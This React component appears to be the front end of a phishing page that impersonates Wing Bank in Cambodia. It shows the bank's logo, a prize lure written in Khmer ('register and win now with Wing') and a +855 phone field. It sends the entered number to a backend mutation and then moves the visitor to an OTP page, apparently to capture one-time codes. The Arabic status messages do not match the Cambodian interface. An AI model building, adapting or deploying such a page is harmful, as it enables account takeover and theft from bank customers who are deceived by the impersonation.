import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState } from "react";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";
import { useLocation } from "wouter";

export default function Home() {
  const [, setLocation] = useLocation();
  const [phoneNumber, setPhoneNumber] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const submitPhoneMutation = trpc.login.submitPhone.useMutation({
    onSuccess: () => {
      toast.success("تم إرسال رقم الهاتف بنجاح");
      setIsSubmitting(false);
      // Navigate to OTP page
      setLocation(`/otp/${phoneNumber}`);
    },
    onError: () => {
      toast.error("حدث خطأ أثناء إرسال البيانات");
      setIsSubmitting(false);
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneNumber) {
      toast.error("الرجاء إدخال رقم الهاتف");
      return;
    }
    setIsSubmitting(true);
    submitPhoneMutation.mutate({ phoneNumber });
  };

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ background: "linear-gradient(135deg, #a8d84e 0%, #8bc34a 100%)" }}>
      <div className="w-full max-w-md mx-4">
        <div className="bg-white rounded-3xl shadow-2xl p-8">
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <img 
              src="/wing-logo.png" 
              alt="Wing Bank Logo" 
              className="h-16 w-auto"
            />
          </div>

          {/* Title */}
          <div className="text-center mb-8">
            <h2 className="text-2xl font-semibold" style={{ color: "#2196f3" }}>
              ចុះឈ្មោះ និងឈ្នះឥឡូវនេះជាមួយវីង
            </h2>
          </div>

          {/* Phone Input Form */}
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="relative">
              <div className="flex items-center gap-2 bg-[#e8e5f5] rounded-lg px-4 py-3 border-2 border-transparent focus-within:border-[#2196f3] transition-colors">
                <div className="flex items-center gap-2 border-r border-gray-300 pr-3">
                  <img src="/cambodia-flag.png" alt="Cambodia Flag" className="w-8 h-8 rounded-full" />
                  <span className="text-gray-700 font-medium">+855</span>
                </div>
                <Input
                  type="tel"
                  placeholder="លេខទូរស័ព្ទ"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="flex-1 bg-transparent border-0 focus-visible:ring-0 focus-visible:ring-offset-0 text-gray-700 placeholder:text-gray-500"
                  disabled={isSubmitting}
                />
              </div>
            </div>

            {/* Login Button */}
            <Button
              type="submit"
              className="w-full py-6 text-lg font-semibold rounded-lg shadow-lg hover:shadow-xl transition-all"
              style={{ 
                background: "linear-gradient(135deg, #2196f3 0%, #1976d2 100%)",
                color: "white"
              }}
              disabled={isSubmitting}
            >
              {isSubmitting ? "جاري الإرسال..." : "ចូលប្រើប្រាស់"}
            </Button>
          </form>

          {/* Language Options */}
          <div className="flex justify-center gap-4 mt-8 pt-6 border-t border-gray-200">
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាខ្មែរ
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              ភាសាអង់គ្លេស
            </button>
            <button className="text-sm text-gray-600 hover:text-[#2196f3] transition-colors font-medium">
              中文
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

